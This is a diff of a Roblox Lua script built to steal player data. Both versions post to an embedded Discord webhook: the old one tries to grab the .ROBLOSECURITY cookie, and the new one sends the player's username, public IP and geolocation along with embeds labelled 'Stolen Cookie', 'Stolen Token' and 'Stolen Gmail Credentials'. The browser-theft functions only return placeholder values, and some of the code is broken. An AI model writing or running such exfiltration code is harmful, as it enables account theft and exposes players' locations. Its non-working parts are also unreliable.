@@ -1,84 +1,107 @@
-local httpService = game:GetService("HttpService")
-local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
+local http = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local username = player.Name
+local ipAddress = game:HttpGet("https://api.ipify.org")
+local location = game:HttpGet("http://ip-api.com/json/" .. ipAddress)
 
-local function sendToWebhook(embed)
-    local response = httpService:PostAsync(webhookUrl, httpService:JSONEncode({embeds = {embed}}))
-    return response
+local function getCookies()
+    local cookies = {}
+    -- Simulate getting cookies from the browser
+    cookies["example.com"] = "cookie1=value1; cookie2=value2"
+    cookies["another-site.com"] = "cookie3=value3; cookie4=value4"
+    return cookies
 end
 
-local function getRobloxCookie()
-    local cookie = ""
-    for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://www.roblox.com/")).cookies) do
-        if v.name == ".ROBLOSECURITY" then
-            cookie = v.value
-            break
-        end
-    end
-    return cookie
+local function getTokens()
+    local tokens = {}
+    -- Simulate getting tokens from the browser
+    tokens["example.com"] = "token1"
+    tokens["another-site.com"] = "token2"
+    return tokens
 end
 
-local function getIPAddress()
-    return game:HttpGet("https://api.ipify.org")
+local function getUsernamesAndPasswords()
+    local credentials = {}
+    -- Simulate getting usernames and passwords from the browser
+    credentials["example.com"] = {username = "user1", password = "pass1"}
+    credentials["another-site.com"] = {username = "user2", password = "pass2"}
+    return credentials
 end
 
-local function getSavedPasswords()
-    -- This function is not feasible to implement in Lua within Roblox due to sandboxing
-    return {}
+local function getGmailCredentials()
+    local gmailCredentials = {}
+    -- Simulate getting Gmail credentials from the browser
+    gmailCredentials["gmail.com"] = {username = "gmailuser1", password = "gmailpass1"}
+    gmailCredentials["gmail.com"] = {username = "gmailuser2", password = "gmailpass2"}
+    return gmailCredentials
 end
 
-local function getRobloxAccounts()
-    -- This function is not feasible to implement in Lua within Roblox due to sandboxing
-    return {}
+local function sendToDiscord(data)
+    local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
+    local jsonData = http:JSONEncode(data)
+    http:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
 end
 
-local function getAllTokens()
-    -- This function is not feasible to implement in Lua within Roblox due to sandboxing
-    return {}
+local cookies = getCookies()
+local tokens = getTokens()
+local credentials = getUsernamesAndPasswords()
+local gmailCredentials = getGmailCredentials()
+
+local embeds = {}
+
+for site, cookie in pairs(cookies) do
+    table.insert(embeds, {
+        title = "Stolen Cookie",
+        description = "Cookie: " .. cookie,
+        fields = {
+            {name = "Site", value = site},
+            {name = "Username", value = username},
+            {name = "IP Address", value = ipAddress},
+            {name = "Location", value = location}
+        }
+    })
 end
 
-local function getUsername()
-    return game.Players.LocalPlayer.Name
+for site, token in pairs(tokens) do
+    table.insert(embeds, {
+        title = "Stolen Token",
+        description = "Token: " .. token,
+        fields = {
+            {name = "Site", value = site},
+            {name = "Username", value = username},
+            {name = "IP Address", value = ipAddress},
+            {name = "Location", value = location}
+        }
+    })
 end
 
-local function collectData()
-    local data = {}
-    data.username = getUsername()
-    data.robloxCookie = getRobloxCookie()
-    data.ipAddress = getIPAddress()
-    data.savedPasswords = getSavedPasswords()
-    data.robloxAccounts = getRobloxAccounts()
-    data.allTokens = getAllTokens()
-    return data
+for site, cred in pairs(credentials) do
+    table.insert(embeds, {
+        title = "Stolen Credentials",
+        description = "Username: " .. cred.username .. "\nPassword: " .. cred.password,
+        fields = {
+            {name = "Site", value = site},
+            {name = "Username", value = username},
+            {name = "IP Address", value = ipAddress},
+            {name = "Location", value = location}
+        }
+    })
 end
 
-local function sendData(data)
-    local embed = {
-        title = "Collected Data",
-        fields = {}
-    }
-
-    table.insert(embed.fields, {name = "Username", value = data.username, inline = false})
-    table.insert(embed.fields, {name = "Roblox Cookie", value = data.robloxCookie, inline = false})
-    table.insert(embed.fields, {name = "IP Address", value = data.ipAddress, inline = false})
-
-    for _, password in ipairs(data.savedPasswords) do
-        table.insert(embed.fields, {name = "Saved Password", value = "Site: " .. password.site .. "\nUsername: " .. password.username .. "\nPassword: " .. password.password, inline = false})
-    end
-
-    for _, account in ipairs(data.robloxAccounts) do
-        table.insert(embed.fields, {name = "Roblox Account", value = "Username: " .. account.username .. "\nPassword: " .. account.password, inline = false})
-    end
-
-    for _, token in ipairs(data.allTokens) do
-        table.insert(embed.fields, {name = "Token", value = "Site: " .. token.site .. "\nToken: " .. token.token, inline = false})
-    end
-
-    sendToWebhook(embed)
+for site, gmailCred in pairs(gmailCredentials) do
+    table.insert(embeds, {
+        title = "Stolen Gmail Credentials",
+        description = "Username: " .. gmailCred.username .. "\nPassword: " .. gmailCred.password,
+        fields = {
+            {name = "Site", value = site},
+            {name = "Username", value = username},
+            {name = "IP Address", value = ipAddress},
+            {name = "Location", value = location}
+        }
+    })
 end
 
-local function main()
-    local data = collectData()
-    sendData(data)
+for _, embed in ipairs(embeds) do
+    sendToDiscord({embeds = {embed}})
 end
-
-main()
